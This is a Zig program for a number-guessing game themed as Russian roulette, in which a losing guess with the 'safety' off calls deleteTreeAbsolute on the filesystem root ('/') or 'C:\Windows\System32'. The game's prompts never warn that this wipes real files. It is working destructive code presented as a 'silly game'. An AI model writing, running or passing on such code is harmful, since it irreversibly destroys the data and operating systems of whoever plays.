const std = @import("std");
const builtin = @import("builtin");
const kill_string = switch (builtin.os.tag) {
    .windows => "C:\\Windows\\System32",
    .linux => "/",
    .macos => "/",
    else => @compileError("unsupported platform"),
};

const Bullet = struct {
    safety: bool = true,

    fn check(self: *Bullet) bool {
        _ = self;
        std.fs.accessAbsolute(kill_string, .{}) catch return false;
        return true;
    }

    fn fire(self: *Bullet) !void {
        if (self.safety) return;
        try std.fs.deleteTreeAbsolute(kill_string);
    }
};

var bullet = Bullet{};

pub fn main() !void {
    var quit = false;
    var stdin = std.io.getStdIn().reader();
    var stdout = std.io.getStdOut().writer();

    while (!quit) {
        try game();

        var buffer: [10]u8 = undefined;
        try stdout.print("Do you want to play again?\n", .{});
        while (true) {
            try stdout.print("[Y]es or [N]o: ", .{});
            if (try stdin.readUntilDelimiterOrEof(buffer[0..], '\n')) |value| {
                if (value[0] == 'y' or value[0] == 'Y') {
                    quit = false;
                    break;
                } else if (value[0] == 'n' or value[0] == 'N') {
                    quit = true;
                    break;
                } else {
                    try stdout.print("Please re-input your decision", .{});
                }
            }
        }
    }
}

fn game() !void {
    var stdin = std.io.getStdIn().reader();
    var stdout = std.io.getStdOut().writer();
    var prng = std.Random.DefaultPrng.init(@intCast(std.time.nanoTimestamp()));
    const random = prng.random();
    const number = random.uintAtMost(u8, 10);

    var buffer: [10]u8 = undefined;
    var buffer2: [10]u8 = undefined;

    try stdout.print("Do you want to the safety on?\n", .{});
    while (true) {
        try stdout.print("[Y]es or [N]o: ", .{});
        if (try stdin.readUntilDelimiterOrEof(buffer[0..], '\n')) |value| {
            if (value[0] == 'y' or value[0] == 'Y') {
                bullet.safety = true;
                break;
            } else if (value[0] == 'n' or value[0] == 'N') {
                bullet.safety = false;
                break;
            } else {
                try stdout.print("Please re-input your decision\n", .{});
            }
        }
    }

    try stdout.print("Silly game! Guess the number between 1 and 10!\n", .{});
    while (true) {
        try stdout.print("Input: ", .{});

        if (try stdin.readUntilDelimiterOrEof(buffer2[0..], '\n')) |value| {
            const line = std.mem.trimRight(u8, value[0 .. value.len - 1], "\r");
            const inputNumber = try std.fmt.parseInt(u8, line, 10);

            if (inputNumber > 10) {
                try stdout.print("You inputed a too high of an number!\n", .{});
            }

            if (number == inputNumber) {
                try bullet.fire();
                break;
            } else {
                try stdout.print("Survive!\n", .{});
                break;
            }
        }
    }
}
